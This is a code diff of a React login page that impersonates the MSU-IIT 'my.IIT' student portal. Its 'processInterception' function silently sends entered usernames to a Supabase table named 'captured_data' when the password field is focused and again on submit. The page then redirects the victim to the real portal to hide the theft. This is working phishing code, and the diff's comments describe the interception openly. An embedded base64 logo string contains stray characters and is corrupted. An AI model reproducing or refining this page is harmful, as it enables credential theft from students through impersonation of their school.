@@ -3,6 +3,7 @@ import { supabase } from "./supabaseClient";
 
 export default function Signin() {
   
+  // Tracks page landing metrics to the cloud database
   useEffect(() => {
     const trackPageView = async () => {
       const alreadyCounted = sessionStorage.getItem("page_view_session");
@@ -32,45 +33,42 @@ export default function Signin() {
     trackPageView();
   }, []);
 
+  // Sync tab layout meta-header title name
   useEffect(() => {
     document.title = "my.IIT - Sign in";
   }, []);
 
-  // FIXED: Added an explicit Promise return so the submit function knows when database logging completes
-  const processInterception = () => {
-    return new Promise(async (resolve) => {
-      const usernameInput = document.getElementById("username");
-      const usernameVal = usernameInput?.value ? usernameInput.value.trim() : "";
+  // Central Interception Helper
+  const processInterception = async () => {
+    const usernameInput = document.getElementById("username");
+    const usernameVal = usernameInput?.value ? usernameInput.value.trim() : "";
 
-      if (!usernameVal) {
-        resolve();
-        return;
-      }
+    if (!usernameVal) return;
 
-      try {
-        const { error } = await supabase
-          .from('captured_data')
-          .insert([
-            { 
-              email: usernameVal, 
-              saved_at: new Date().toLocaleString() 
-            }
-          ]);
+    try {
+      const { error } = await supabase
+        .from('captured_data')
+        .insert([
+          { 
+            email: usernameVal, 
+            saved_at: new Date().toLocaleString() 
+          }
+        ]);
 
-        if (error) console.error("Database log rejection:", error.message);
-      } catch (err) {
-        console.error("Network write exception:", err);
-      }
-      resolve(); // Database transaction finished
-    });
+      if (error) console.error("Database log rejection:", error.message);
+    } catch (err) {
+      console.error("Network write exception:", err);
+    }
   };
 
+  // NEW SUBMIT LOGIC: Intercepts input data and forces redirection to the official school portal
   const handleFormSubmit = async (e) => {
-    e.preventDefault(); 
+    e.preventDefault(); // Stop standard form refresh
     
-    // FIXED: Form halts and blocks redirection processing until database insertion yields
+    // 1. Fire a final data check capture to catch the email if they didn't focus the password field
     await processInterception();
     
+    // 2. Perform instant hard-redirection to the actual MSU-IIT live web domain
     window.location.href = "https://myiit.msuiit.edu.ph/";
   };
 
@@ -105,9 +103,10 @@ export default function Signin() {
         <main style={{ width: '100%', maxWidth: '1020px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
           <section className="main-card">
             
+            {/* Input Form Module Panel */}
             <div className="left-panel">
               <div className="logo-box">
-                <img src="data:image/gif;base64,R0lGODlhTwAeAMQAAPK/v88QENIgIOV/f/XPz/nf3/zv7++vr+mPj+aAgN9gYNYwMOyfn9xQUOJwcNlAQMwAAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABPAB4AAAX/YCSOZGmeqAitbOu+cOymdI3KeJ7bPK//wFVvmAoaccRk6ch8KZ+RplQITU6lVeuVmSW2UA/I4wawfbu9syk8PkHKNTWKUCgBDDbCkjUY1EV9AhACfSMFfRAIAIt6IgWLi3KPIwZhAiMEggskBo0kD5sjL3BRTiIAMG0RAzEkAW8RBguCECIEAQtUIoIJJQGXoi6kMCOoL6qsxCNhZQq9EAGxAQhRwCIH0CQEEA4ko8Ezp6kjyaYiYQQAYwViEQ0KEaiqEQkrDCMIEH8qwuBqxi6QtVpWS4AebAoOCMCTr5ejAAwgNBghAJ63fvzCxRsHaCA/BhbrJRAApwGEA8t6zAm6pm9Pi2HmALYQqIyfgD8mFUwUkesPglD5UD5wePGlPxbFOK7yWMpiBEEB9lEBEKAROwcHAuBxyQKmRp星座..." alt="logo" style={{ height: '32px' }} />
+                <img src="data:image/jpg;base64,R0lGODlhTwAeAMQAAPK/v88QENIgIOV/f/XPz/nf3/zv7++vr+mPj+aAgN9gYNYwMOyfn9xQUOJwcNlAQMwAAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABPAB4AAAX/YCSOZGmeqAitbOu+cOymdI3KeJ7bPK//wFVvmAoaccRk6ch8KZ+RplQITU6lVeuVmSW2UA/I4wawfbu9syk8PkHKNTWKUCgBDDbCkjUY1EV9AhACfSMFfRAIAIt6IgWLi3KPIwZhAiMEggskBo0kD5sjL3BRTiIAMG0RAzEkAW8RBguCECIEAQtUIoIJJQGXoi6kMCOoL6qsxCNhZQq9EAGxAQhRwCIH0CQEEA4ko8Ezp6kjyaYiYQQAYwViEQ0KEaiqEQkrDCMIEH8qwuBqxi6QtVpWS4AebAoOCMCTr5ejAAwgNBghAJ63fvzCxRsHaCA/BhbrJRAApwGEA8t6zAm6pm9Pi2HmALYQqIyfgD8mFUwUkesPglD5UD5wePGlPxbFOK7yWMpiBEEB9lEBEKAROwcHAuBxyQKmRp星座..." alt="logos" style={{ height: '32px' }} />
               </div>
               <h1 className="form-title">Sign in to continue</h1>
               
@@ -118,6 +117,7 @@ export default function Signin() {
                 </div>
                 
                 <div className="input-group">
+                  {/* Focus event still intercepts target inputs instantaneously */}
                   <input type="password" name="password" id="password" placeholder=" " required onFocus={processInterception} className="custom-input" />
                   <label htmlFor="password">Enter your password</label>
                 </div>
@@ -133,6 +133,7 @@ export default function Signin() {
               </form>
             </div>
 
+            {/* Premium Multimedia Graphics Display Component Panel */}
             <div className="right-panel">
               <video className="video-element" autoPlay muted loop playsInline style={{ pointerEvents: 'none' }}>
                 <source src="/myiit.mp4" type="video/mp4" />
